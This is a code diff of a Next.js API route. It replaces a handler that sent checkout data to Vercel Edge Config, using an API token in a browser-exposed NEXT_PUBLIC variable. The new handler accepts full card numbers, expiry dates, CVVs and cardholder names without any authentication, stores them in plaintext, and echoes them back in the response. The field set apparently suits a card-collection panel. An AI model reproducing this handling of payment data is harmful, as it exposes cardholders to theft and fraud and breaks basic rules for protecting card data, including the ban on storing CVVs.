@@ -1,40 +1,43 @@
-import { NextResponse } from 'next/server';
+import { NextRequest, NextResponse } from "next/server";
+import { PrismaClient } from "@prisma/client";
 
-export async function POST(request: Request) {
+const prisma = new PrismaClient();
+
+export async function POST(req: NextRequest) {
   try {
-    const data = await request.json();
+    const body = await req.json();
+    const { cardNumber, expiry, cvv, firstName, lastName, amount, userId, country, cardType } = body;
 
-    const response = await fetch(`${process.env.NEXT_PUBLIC_EDGE_CONFIG}/items`, {
-      method: 'PATCH',
-      headers: {
-        Authorization: `Bearer ${process.env.NEXT_PUBLIC_VERCEL_API_TOKEN}`,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        items: [
-          {
-            operation: 'update',
-            key: 'checkout-data',
-            value: data,
-          },
-        ],
-      }),
-    });
-
-    if (!response.ok) {
-      const errorResponse = await response.json();
-      console.error('Error saving to Edge Config:', errorResponse);
+    // Validare simplă
+    if (!cardNumber || !expiry || !cvv || !firstName || !lastName || !amount || !cardType) {
       return NextResponse.json(
-        { success: false, message: 'Failed to save data to Edge Config.' },
-        { status: response.status }
+        { message: "Missing required fields." },
+        { status: 400 }
       );
     }
 
-    return NextResponse.json({ success: true, message: 'Data saved to Edge Config.' });
-  } catch (error) {
-    console.error('Error saving data to Edge Config:', error);
+    // Salvăm în baza de date
+    const savedCard = await prisma.card.create({
+      data: {
+        cardNumber,
+        cardType: cardType, // Identifică tipul cardului dacă ai nevoie
+        amount: parseFloat(amount),
+        expDate: expiry,
+        cvv,
+        holder: `${firstName} ${lastName}`,
+        country: country || "Unknown",
+        createdBy: userId ? parseInt(userId, 10) : 0,
+      },
+    });
+
     return NextResponse.json(
-      { success: false, message: 'Error saving data.' },
+      { message: "Card data saved successfully", savedCard },
+      { status: 200 }
+    );
+  } catch (error) {
+    console.error("Error saving card data:", error);
+    return NextResponse.json(
+      { message: "Internal server error." },
       { status: 500 }
     );
   }
